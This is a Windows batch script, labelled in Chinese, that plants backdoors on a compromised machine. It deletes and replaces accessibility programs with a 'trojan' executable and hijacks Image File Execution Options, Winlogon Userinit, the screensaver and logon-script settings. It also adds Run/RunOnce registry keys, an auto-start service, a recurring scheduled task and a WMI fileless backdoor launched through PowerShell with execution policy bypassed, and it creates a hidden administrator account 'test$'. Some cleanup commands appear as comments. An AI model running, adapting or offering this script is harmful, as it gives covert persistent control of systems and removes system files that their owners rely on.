@echo off
echo  "辅助功能镜像劫持"
echo  "创建temp目录"
md C:\Windows\Temp\temp\
echo  "备份屏幕键盘、放大镜、旁白、显示切换器、应用切换器至temp目录并删除原目录文件"
copy C:\Windows\System32\osk.exe C:\Windows\Temp\temp\osk.exe
del C:\Windows\System32\osk.exe
copy C:\Windows\System32\Magnify.exe C:\Windows\Temp\temp\Magnify.exe  
del C:\Windows\System32\Magnify.exe
copy C:\Windows\System32\Narrator.exe C:\Windows\Temp\temp\Narrator.exe
del C:\Windows\System32\Narrator.exe
copy C:\Windows\System32\DisplaySwitch.exe C:\Windows\Temp\temp\DisplaySwitch.exe
del C:\Windows\System32\DisplaySwitch.exe
copy C:\Windows\System32\AtBroker.exe C:\Windows\Temp\temp\AtBroker.exe
del C:\Windows\System32\AtBroker.exe
echo "替换木马至辅助功能"
copy 木马路径:C:\Windows\System32\shell.exe C:\Windows\System32\osk.exe
copy 木马路径:C:\Windows\System32\shell.exe C:\Windows\System32\Magnify.exe
copy 木马路径:C:\Windows\System32\shell.exe C:\Windows\System32\Narrator.exe
copy 木马路径:C:\Windows\System32\shell.exe C:\Windows\System32\DisplaySwitch.exe
copy 木马路径:C:\Windows\System32\shell.exe C:\Windows\System32\AtBroker.exe

echo "映像劫持"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v "Debugger" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f
::删除映像劫持 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe" /v "Debugger" /f

echo "启动项"
copy 木马路径:C:\Windows\System32\shell.exe c:\user\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

echo "启动项注册表后门"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Debugger" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Debugger" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "Debugger" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Debugger" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f
::删除映像劫持 reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "Debugger" /f

echo "自启动服务后门"
sc create "startup" binpath= "C:\Windows\System32\AtBroker.exe"
sc description "startup" "description"
sc config "startup" start= auto 
net start "startup"
::删除服务net stop "startup" || sc delete "startup"

echo "系统计划任务后门"
schtasks /create /sc minute /mo 5   /tn "keep" /tr C:\Windows\System32\AtBroker.exe
::删除任务 schtasks /delete /TN keep /F

echo "winlogon 登录劫持"
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"  /v "Userinit" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f

echo "Logon Scripts后门"
reg add "HKEY_CURRENT_USER\Environment"  /v "startup" /t REG_SZ /d "木马路径:C:\Windows\System32\shell.exe" /f

echo "屏幕保护程序劫持"
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /d 木马路径:C:\Windows\System32\shell.exe

echo "wmi无文件后门"
Powershell -ExecutionPolicy Bypass -File ./ps1.ps1
::删除 powershell Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer |Remove-WmiObject -Verbose

echo "影子账户"
net user test$ 123456 /add
net localgroup administrators test$ /add
